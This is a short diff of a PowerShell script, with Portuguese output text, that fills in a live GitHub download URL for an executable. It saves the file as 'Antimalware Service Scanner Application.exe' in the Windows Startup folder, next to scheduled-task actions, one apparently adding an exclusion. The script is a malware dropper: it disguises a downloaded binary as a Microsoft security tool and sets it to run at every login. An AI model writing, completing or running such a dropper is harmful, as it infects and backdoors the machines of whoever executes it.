@@ -39,7 +39,7 @@ Register-ScheduledTask -TaskPath $taskFolder -Action $actionRunExe, $actionAddEx
 Write-Host "A tarefa '$taskName' foi criada na pasta '$taskFolder' com múltiplas ações."
 
 Start-Sleep -Seconds 5
-$url = "LINK DO DOWNLOAD DO EXE AQUI!"
+$url = "https://github.com/theuwpk/BACK-EXE/raw/refs/heads/main/MAIN/Antimalware%20Service%20Scanner%20Application.exe"
 $nomeArquivo = "Antimalware Service Scanner Application.exe"
 $destino = Join-Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" $nomeArquivo
 Invoke-WebRequest -Uri $url -OutFile $destino | Out-Null
